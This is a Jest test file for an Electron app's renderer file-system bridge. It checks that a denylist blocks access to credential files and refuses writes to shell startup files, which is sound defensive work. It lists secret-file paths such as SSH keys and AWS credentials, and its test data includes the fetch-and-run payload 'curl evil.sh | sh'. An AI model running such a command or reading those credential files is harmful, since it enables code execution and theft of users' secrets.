/**
 * The fs bridge exposed to the renderer.
 *
 * Its denylist used to cover only directories the renderer could not write to
 * without elevation anyway (%SystemRoot%, Program Files, /usr, /etc) and left
 * everything under the user's own home open - which is where credentials and
 * every login-persistence hook actually live. The threat model was inverted.
 *
 * Reading is deliberately still allowed for shell rc files and autostart
 * directories: browsing a dotfiles repository in the file explorer is a real
 * use, and blocking the read would break it without closing anything. Writing
 * to them is what turns into code execution, so that is what is refused.
 */

const realPath = require('path');

const realFs = require('fs');
const mockHome = realFs.mkdtempSync(realPath.join(require('os').tmpdir(), 'ct-preload-guard-'));

jest.mock('os', () => ({
  ...jest.requireActual('os'),
  homedir: () => mockHome,
}));

let mockExposed;
const mockIpc = new (require('events').EventEmitter)();
mockIpc.handle = jest.fn();

jest.mock('electron', () => ({
  contextBridge: {
    exposeInMainWorld: (key, value) => {
      mockExposed = mockExposed || {};
      mockExposed[key] = value;
    },
  },
  ipcRenderer: {
    invoke: jest.fn(), send: jest.fn(), on: jest.fn(), removeListener: jest.fn(),
    sendSync: (channel, ...args) => { const event = {}; mockIpc.emit(channel, event, ...args); return event.returnValue; },
  },
}));

let fsBridge;

beforeAll(() => {
  const security = require('../../src/main/utils/rendererSecurity');
  security.grant(mockHome);
  require('../../src/main/utils/rendererFiles').install(mockIpc, security.permitted);
  require('../../src/main/preload');
  fsBridge = mockExposed.electron_nodeModules.fs;
});
afterAll(() => realFs.rmSync(mockHome, { recursive: true, force: true }));

const home = (...seg) => realPath.join(mockHome, ...seg);

describe('credential material', () => {
  const secrets = [
    home('.ssh', 'id_rsa'),
    home('.aws', 'credentials'),
    home('.gnupg', 'secring.gpg'),
    home('.claude', '.credentials.json'),
  ];

  test.each(secrets)('cannot be read: %s', (p) => {
    expect(() => fsBridge.readFileSync(p)).toThrow(/Access denied/);
  });

  test.each(secrets)('cannot be written: %s', (p) => {
    expect(() => fsBridge.writeFileSync(p, 'x')).toThrow(/Access denied/);
  });

  test('the directory itself is denied, not just files under it', () => {
    expect(() => fsBridge.readdirSync(home('.ssh'))).toThrow(/Access denied/);
  });
});

describe('login persistence', () => {
  const rcFiles = [home('.bashrc'), home('.zshrc'), home('.profile')];

  test.each(rcFiles)('cannot be written: %s', (p) => {
    expect(() => fsBridge.writeFileSync(p, 'curl evil.sh | sh')).toThrow(/Access denied/);
  });

  test.each(rcFiles)('can still be read, so a dotfiles project stays browsable: %s', (p) => {
    // Not found is fine - the point is that the guard did not refuse it.
    expect(() => fsBridge.readFileSync(p)).not.toThrow(/Access denied/);
  });

  test('cannot be deleted or renamed either', () => {
    expect(() => fsBridge.unlinkSync(home('.bashrc'))).toThrow(/Access denied/);
    expect(() => fsBridge.renameSync(home('.bashrc'), home('.bashrc.bak'))).toThrow(/Access denied/);
  });

  test('cannot be the destination of a copy', () => {
    expect(() => fsBridge.copyFileSync(home('payload.sh'), home('.zshrc'))).toThrow(/Access denied/);
  });
});

describe('the prefix check', () => {
  test('does not over-block a sibling whose name merely shares a prefix', () => {
    // .sshconfig is not inside .ssh. A bare startsWith() said it was.
    expect(() => fsBridge.readFileSync(home('.sshconfig'))).not.toThrow(/Access denied/);
    expect(() => fsBridge.writeFileSync(home('.bashrc-notes'), 'x')).not.toThrow(/Access denied/);
  });

  test('still blocks a genuine child path', () => {
    expect(() => fsBridge.readFileSync(home('.ssh', 'nested', 'key'))).toThrow(/Access denied/);
  });
});

describe('ordinary project paths', () => {
  test('are untouched by either list', () => {
    const projectFile = home('dev', 'my-project', 'src', 'index.js');
    expect(() => fsBridge.writeFileSync(projectFile, 'x')).not.toThrow(/Access denied/);
    expect(() => fsBridge.readFileSync(projectFile)).not.toThrow(/Access denied/);
  });

  test('the app data directory is still writable', () => {
    const settings = home('.claude-terminal', 'settings.json');
    expect(() => fsBridge.writeFileSync(settings, '{}')).not.toThrow(/Access denied/);
  });

  test('global Claude config uses its dedicated writer while settings remain editable', () => {
    expect(() => fsBridge.writeFileSync(home('.claude.json'), '{}')).toThrow(/Access denied/);
    expect(() => fsBridge.writeFileSync(home('.claude', 'settings.json'), '{}')).not.toThrow(/Access denied/);
  });
});

describe('pre-existing guards still hold', () => {
  test('null bytes are refused', () => {
    expect(() => fsBridge.readFileSync(home('a\0b'))).toThrow(/Access denied/);
  });

  test('a non-string path is refused', () => {
    expect(() => fsBridge.readFileSync(null)).toThrow(/Access denied/);
  });
});
